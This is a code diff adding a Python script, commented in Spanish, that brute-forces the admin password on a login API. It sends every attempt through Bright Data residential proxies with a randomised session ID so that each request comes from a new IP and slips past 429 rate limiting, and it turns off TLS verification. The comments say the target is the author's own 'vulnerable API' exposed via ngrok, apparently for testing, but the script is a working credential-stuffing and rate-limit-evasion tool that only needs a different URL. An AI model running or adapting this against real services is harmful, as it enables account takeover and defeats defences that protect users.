@@ -1,0 +1,101 @@
+#!/usr/bin/env python3
+import requests
+import time
+import sys
+import urllib3
+
+# Desactivar advertencias de SSL para proxys (opcional)
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# Configuración de Bright Data (User to fill)
+# En Bright Data, el formato suele ser: brd-customer-<ID>-zone-<ZONE>:password
+BD_USERNAME = "brd-customer-USER_ID-zone-RESIDENTIAL_ZONE" 
+BD_PASSWORD = "PASSWORD"
+BD_HOST = "brd.superproxy.io"
+BD_PORT = "22225" # Puerto estándar de Bright Data
+
+# Objetivo (Tu VULNERABLE-API expuesta por NGROK o similar)
+# NOTA: Bright Data NO puede acceder a 'localhost' o 'vulnerable-api' interno.
+# Necesitas una URL pública (ngrok, AWS, etc.)
+TARGET_URL = "https://TU-URL-NGROK.ngrok-free.app/api/login"
+CHECK_IP_URL = "https://TU-URL-NGROK.ngrok-free.app/api/check-ip"
+
+def get_proxy_url():
+    """Construye la URL del proxy autenticado"""
+    return f"http://{BD_USERNAME}:{BD_PASSWORD}@{BD_HOST}:{BD_PORT}"
+
+def check_current_ip():
+    """Verifica qué IP está usando el Proxy"""
+    proxies = {
+        "http": get_proxy_url(),
+        "https": get_proxy_url()
+    }
+    try:
+        # Usamos httpbin o la API propia para ver la IP de salida
+        # r = requests.get("http://lumtest.com/myip.json", proxies=proxies, verify=False, timeout=10)
+        # O contra nuestro objetivo si está público
+        r = requests.get(CHECK_IP_URL, proxies=proxies, verify=False, timeout=10)
+        print(f"[*] Salida Proxy: {r.text.strip()}")
+        return r.text
+    except Exception as e:
+        print(f"[!] Error proxy: {e}")
+        return None
+
+def attack():
+    print(f"[*] Iniciando ataque vía Bright Data Residential Proxies")
+    print(f"[*] Host: {BD_HOST}:{BD_PORT}")
+    print(f"[*] Zona: {BD_USERNAME}")
+    
+    if "USER_ID" in BD_USERNAME:
+        print("\n[!] ALERTA: Debes configurar BD_USERNAME y BD_PASSWORD en el script.")
+        print("[!] Saliendo...")
+        sys.exit(1)
+
+    print("\n[*] Probando conexión inicial...")
+    check_current_ip()
+
+    proxies = {
+        "http": get_proxy_url(),
+        "https": get_proxy_url()
+    }
+
+    # Ataque
+    for i in range(1, 20):
+        try:
+            # En Bright Data, cada sesión cambia de IP si no se mantiene la sesión
+            # O se puede añadir '-session-rand' al username para forzar rotación
+            
+            # Forzar rotación añadiendo random session ID al usuario (Feature de Bright Data)
+            # Formato: username-session-RANDOM
+            import random
+            session_id = random.randint(1, 999999)
+            user_rotated = f"{BD_USERNAME}-session-{session_id}"
+            proxy_rotated = f"http://{user_rotated}:{BD_PASSWORD}@{BD_HOST}:{BD_PORT}"
+            
+            current_proxies = {
+                "http": proxy_rotated,
+                "https": proxy_rotated
+            }
+
+            payload = {
+                "username": "admin",
+                "password": f"pass_{i}" # Brute force
+            }
+            
+            print(f"[{i}] Enviando petición (Session: {session_id})...")
+            start = time.time()
+            r = requests.post(TARGET_URL, json=payload, proxies=current_proxies, verify=False, timeout=15)
+            latency = time.time() - start
+            
+            if r.status_code == 429:
+                print(f"   ⛔ Bloqueado (Status 429). La IP no rotó correctamente.")
+            elif r.status_code == 401:
+                print(f"   ✅ Intento fallido (200/401) - Bypass Exitoso ({latency:.2f}s)")
+            else:
+                print(f"   ❓ Status: {r.status_code}")
+
+        except Exception as e:
+            print(f"   [!] Error: {e}")
+
+if __name__ == "__main__":
+    attack()
